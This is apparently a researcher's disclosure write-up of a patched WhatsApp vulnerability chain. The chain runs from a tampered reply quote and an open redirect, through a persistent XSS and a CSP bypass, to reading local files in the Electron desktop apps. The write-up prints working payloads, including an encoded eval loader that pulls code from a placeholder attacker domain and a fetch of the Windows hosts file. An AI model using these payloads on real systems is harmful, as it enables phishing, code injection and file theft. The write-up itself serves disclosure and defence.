
> tl;dr: This is the story of how I found and helped **Facebook** patch multiple security flaws in **WhatsApp**, all the way from a simple **Open-Redirect** through a **Persistent-XSS** and **CSP-bypass** to a full cross platforms **Read From The Local File System** on both Windows and Mac and got **12,500$** as a reward!

---

Back in 2017, while I was traveling in Peru, I found a security flaw that Check Point published a few months later. That flaw was simple. In the words of Check Point’s researchers in this article published in 2018, it allowed an attacker to “alter the text of someone else’s reply, essentially putting words in their mouth.”

It was cool, but back then I couldn’t come up with any idea of further exploiting the flaw or finding related flaws. So except for trolling my friends a couple of times in our group chat, I kind of let it go.

A year later, I decided to continue my research. I really wanted to find a major security flaw in a well-known and widely used service, and I felt like WhatsApp was a good start. So I gave it a go since I already had some clue of existing security flaws in WhatsApp mobile and web applications.

I was not ready for what the next few months brought with them, but I can assure you - it was one hell of a ride. I managed to find four more unique security flaws in WhatsApp which led me all the way to persistent XSS and even reading from the local file system - by using a single message.

This was my process:

### 1. My original finding - ‘altering the text of someone else’s reply’

First, let’s talk about what I found in the first place, in 2017, since it is the foundation for this research.

I originally thought: “Using WhatsApp web, I can find the line of code where the object containing the metadata of the message is being formed, tamper with it, and then let the app continue in its natural message-sending flow, thus crafting my message while bypassing the UI filtering mechanism."

So for example, by using this technique, I can alter the text of a reply to a message and send it, something I can’t achieve by legitimately using WhatsApp Web UI.
I found that line and managed to have a look at the Object containing the metadata of the message. You can find this line by looking up `return Promise.callSynchronously(function()` in the entire code and set a breakpoint at `var t = e.id;`. It had a lot of interesting fields, so we’ll focus here on the relevant ones:
```javascript
e = {
    "__x_body": "Why would you say that?!",
    "__x_type": "chat",
    "__x_quotedMsg": {
        "body": "I think you are the best!",
        "type": "chat",
        "mentionedJidList": [],
        "isForwarded": false,
        "labels": []
    },
    "__x_quotedStanzaID": "3EB0E42AC64D3D9BC5E7",
}
```

So essentially, I discovered that by simply running:
```javascript
e.__x_quotedMsg.body = 'I think you are the worst!'; // alter the text
e.__x_quotedStanzaID = e.__x_quotedStanzaID + '_'; // change the id of the original message
```
before allowing the message send to execute, you'll get this:

![1](./1.jpg)

*(This works for WhatsApp iOS/Android/Windows Desktop/Mac Desktop/Web)*

The body of the reply quote is of a message that I have made up and was never really sent in the current conversation.
That's cool, but not that powerful.

What else can I take apart? What about messages with rich preview banners?

### 2. Dangerous Open-Redirect flaw in messages with rich preview banner using "@"

This is where this research becomes way more interesting. Messages with rich preview banners are messages that include banners with extra information regarding a link that is in the body of the message. So for example, if I send a message with "https://facebook.com" as its body, the receiver will get this:

![2](./2.jpg)

On WhatsApp the banner is being generated on the side of the sender and this is an important point to understand. One can easily tamper with the banner properties before sending it to the receiver. Great recipe for trouble right here!

The first thing I did was to craft a message that will include a legitimate looking banner, but will redirect to another domain instead by simply replacing the link:

```javascript
e.__x_body = e.__x_matchedText = 'https://example.com'
```

And this is what I got:

![3](./3.jpg)

*(This works for WhatsApp iOS/Android/Windows Desktop/Mac Desktop/Web)*

Cool! Now even though the banner seems like it comes from Facebook, clicking the link will redirect to https://example.com!

Being familiar with all sorts of tricks used by malicious actors in the world of web, I experimented with this idea to see if this open redirect can be made more dangerous:

```javascript
e.__x_body = e.__x_matchedText = 'Join Facebook! https://facebook.com+login_oage&welcome_to_facebook=true&timestamp=42837643@bit.ly/2SfZikR Become a friend of mine!'
```

![4](./4.jpg)

*(This works for WhatsApp iOS/Android/Windows Desktop/Mac Desktop/Web)*

See what I did? I managed to not only mess with the banner's link, but also crafted a message with a link that looks like it belongs to https://facebook.com while the link will always redirect to https://example.com!

This is dangerous because it appears authentic since both the banner and the link look like they really do belong to https://facebook.com

This works thanks to the role "@" plays in the [spec of URL](https://www.w3.org/Addressing/URL/url-spec.txt):

The purpose of "@" in URLs is to pass username and password to visited domains in the following way: `https://USERNAME:PASSWORD@DOMAIN.COM`. One can abuse this, as I just did, and replace the username and password with anything else: `https://DOMAIN-A.COM@DOMAIN-B.com` and it'll still work. Firefox is the only browser that warns users, by default, In case this method is used without providing a username and password.

And then it hit me - if I can tamper with the message and send any link, would I be able to use `javascript:` URIs?

### 3. From an Open-Redirect to a Persistent-XSS using `javascript:` URIs

YES! But it's not as simple as that.

At first, that's exactly what I did:

```javascript
e.__x_body = e.__x_matchedText = 'javascript:alert(document.domain)'
```

But it didn't work. WhatsApp seemed to drop the banner on the receiving side. After a few failed attempts a thought came to my mind: maybe this happens because WhatsApp looks at the link that is attached to the banner and expects it to include a legitimate `https:` scheme URI?

So channeling my inner hacker , I did this:

```javascript
e.__x_body = e.__x_matchedText = 'javascript:"https://example.com";alert(document.domain)'
```

AND IT WORKED!

![5](./5.jpg)

*(This works for WhatsApp Windows Desktop/Mac Desktop/Web)*

Gained a one-click Persistent-XSS!

Fortunately for WhatsApp, Chromium based browsers added a defense mechanism against `javascript:` URIs just when I found this vulnerability. Unfortunately for WhatsApp, on other browsers such as Safari and Edge, this vulnerability was still wide open.The picture above is using Brave - an older version of the Chromium based browser.

When clicked, the message on native mobile WhatsApp apps normally opens https://example.com instead of running the XSS (Obviously, because XSS is rarely relevant for native mobile apps).

Now, I couldn't achieve a state in which the payload is not a visible part of the message. This is because WhatsApp has a part in their code that checks whether the content of the link URI is included in the body of the message when the messages are being loaded.
If there is no match, WhatsApp will omit the banner and the exploit won't work. The best I managed to achieve was to create a long enough message, so the "Read more.." feature would turn on, and make sure the actual payload would be at the very bottom of the body of the message where you could only see it if you clicked "Read more..".

I had to think of a way to manage to create a very small payload that would load a bigger payload from a different origin, to make the entire thing as unsuspicious as possible. This would mean bypassing WhatsApp's CSP rules, which would not be an easy task.

### 4. Bypassing WhatsApp's CSP rules in order to enhance the power of the Persistent-XSS

Bypassing CSP rules is made easier by [Google's CSP Evaluator](https://csp-evaluator.withgoogle.com/). You just throw the URL address of the target website into the text box, and it immediately tells you its CSP configuration and how safe (or unsafe) the website is:

![6](./6.jpg)

You see that `object-src [missing]` down there? (😈)

This is what I am going to do. Using my `javascript:` trick, I am going to inject the following payload to my malicious message:

```javascript
var payload = `
  hard_expire_time.innerHTML +=
  '<object data="https://MY_MALICIOUS_DOMAIN/MY_PAYLOAD_IFRAME.html" />';
  onmessage=(e)=>{eval(JSON.parse(e.data))};
`;
payload = `javascript:"https://facebook.com";eval(atob("${btoa(payload)}"))`;
e.__x_body = e.__x_matchedText = payload;
```

And the content of `https://MY_MALICIOUS_DOMAIN/MY_PAYLOAD_IFRAME.html` would be:
```html
<html>
  <head></head>
  <body>
    <script>
      top.postMessage(
	     JSON.stringify(
		    "open('https://facebook.com');
        alert('external payload');"
	     ),
      "*");
    </script>
  </body>
</html>
```

*(This works for WhatsApp Web)*

See what I just did?
Since `object-src` directive is missing, it means I can use `object` to load an iframe(ish) to any origin of my choice. That way I'll be able to run any external code with no size limits and no problems! All that is left to do is to execute that code on `web.whatsapp.com` domain and not on my own iframe's domain, otherwise that'll be pretty useless.

To achieve that, I simply use the XSS to load the iframe and then listen to the messages that are posted by different windows. I then use the iframe to post a message to the top window with the content of the external code.

The top window, where the XSS was executed, receives the message from the iframe, parses the external payload provided by it and executes it in its context (`web.whatsapp.com`).

Win! External payload was successfully fetched and executed in the context of WhatsApp!

Oh, and that `hard_expire_time.innerHTML` trick? It was the shortest way I could think of at the moment to make the DOM load my Object element (`hard_expire_time` is an element in the DOM of the website).

### 5. From Persistent-XSS to Reading from the File System on Mac/Windows with a potential for RCE

Surprisingly, this is the easy part. WhatsApp has desktop applications for both Mac and Windows.

I was very skeptical about being able to use the cool XSS I'd found on the desktop applications. After all, they're probably not made of HTML and JS, right?

I clicked the same malicious message I used on the web app through the Windows desktop application and I was amazed to see this:

![7](./7.jpg)

*(This works for WhatsApp Windows Desktop/Mac Desktop/Web)*

WOW! I mean, the `document.domain` part didn't really work - but the `alert()` part sure did! How is that possible?!

I went online, knowing very well I would find an answer, and this was what I quickly discovered:

These types of applications are written using [Electron](https://electronjs.org/).
Electron is a cool platform that lets you create "native" applications using standard web features. This makes things super easy for a lot of big companies since it allows them to have one source code for both their web applications and native desktop applications. Electron constantly updates along with the platform it is based on: Chromium.

That means my XSS works since this is - after all - a variant of Chromium!

But wait, earlier I've learned that my `javascript:` trick doesn't work on Chromium based browsers since the recent patch. So why does this XSS work on Electron?

I decided to use my XSS to alert the userAgent of the currently running application, and the following major security flaw blew-my-mind:

![8](./8.jpg)

*(This works for WhatsApp Windows Desktop/Mac Desktop)*

For experienced vulnerability researchers, there is enough data in this alert message to immediately identify the RCE potential, so take a second, and think about it!

That's right - `Chrome/69` - the latest version of the WhatsApp desktop applications provided by WhatsApp is `Chrome/69` based. This vulnerability was found when `Chrome/78` was the stable version! A few versions before `Chrome/78`, the ability to use the `javascript:` trick was patched, and if WhatsApp would have updated their Electron web application from 4.1.4 to the latest which was 7.x.x at the time this vulnerability was found(!) - this XSS would never have existed!

And even worse - Since Chromium 69 is relatively old, exploiting a 1-day RCE is possible! There are more than 5 different 1-day RCEs in Chromium 69 or higher, you just need to find a published one and use it through the persistent XSS found earlier and BAM: Remote Code Execution ACHIEVED!

I did not take the time to actually exploit a public RCE, and therefore didn’t get the chance to prove the existence of such a vulnerability, but the theoretical concept is as follows: if you run an old version of a vulnerable app, one can exploit that vulnerability and do bad things to you. I did however demonstrated how I use `fetch()` API, for example, to read files from the local OS like the content of `C:\Windows\System32\drivers\etc\hosts` file in this case:

![9](./9.jpg)

*(This works for WhatsApp Windows Desktop/Mac Desktop)*

For some reason, the CSP rules were not an issue with the Electron based app, so fetching an external payload using a simple javascript resource worked. This is the payload I used the XSS to fetch and execute from my remote malicious server:

```javascript
alert(navigator.userAgent);
(async function(){
	// read "file:///C:/Windows/System32/drivers/etc/hosts" content
	const r = await fetch('file:///C:/Windows/System32/drivers/etc/hosts);
	const t = await r.text();
	alert(t)
}())
```

And that was it. This was my full journey, all the way from a simple Open-Redirect, through a Persistent-XSS and a CSP-bypassing to a full Cross Platform Read from the File System plus potentially a Remote-Code-Execution 🎉.

### Key Takeaways From This Research

There are some very serious security flaws here that all companies should learn from:

1. If your app uses rich preview banners and those banners are crafted on the sending side, your filtering on the receiving side must be spot on. You just can't let weird URLs load on the receiving side without making sure they're legit. Heck, if your app generally crafts messages on the client side, your filtering on the receiving side must be spot on!

2. CSP rules are super important and could have prevented a big part of this mess.If the CSP rules were well configured, the power gained by this XSS would have been much smaller. Being able to bypass the CSP configuration allows an attacker to steal valuable information from the victim, load external payloads easily, and much more!

3. If you're going to use Electron, you HAVE to make sure it is updated with each update of Chromium. And this is such a big one - Chromium updates are not just cool new features, in most Chromium updates, serious vulnerabilities are being patched! When Chromium is being updated, your Electron-based app must get updated as well, otherwise you leave your users vulnerable to serious exploits for no good reason!


### Summary

And that's pretty much it. I have to admit I've put a lot of effort and time into this research, but I'm glad to say it all paid off. I think there are a few very interesting ideas here that should inspire you to explore new types of security flaws that probably exist out there. I encourage you to go ahead and do that responsibly!  And if you're on the other side of the game, please use this article to harden your application. It is 2020, no product should be allowing a full read from the file system and potentially a RCE from a single message.

> Facebook have patched and assigned this [CVE](https://nvd.nist.gov/vuln/detail/CVE-2019-18426). Thanks Facebook for being so responsive and for the very generous bounty of 12,500$!
> By the [official CVSS calculator](https://www.first.org/cvss/calculator/3.1) this vulnerability was scored with [8.8 (High)](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H/E:P/RL:T/RC:C) however this was never officially acknowledged by Facebook.
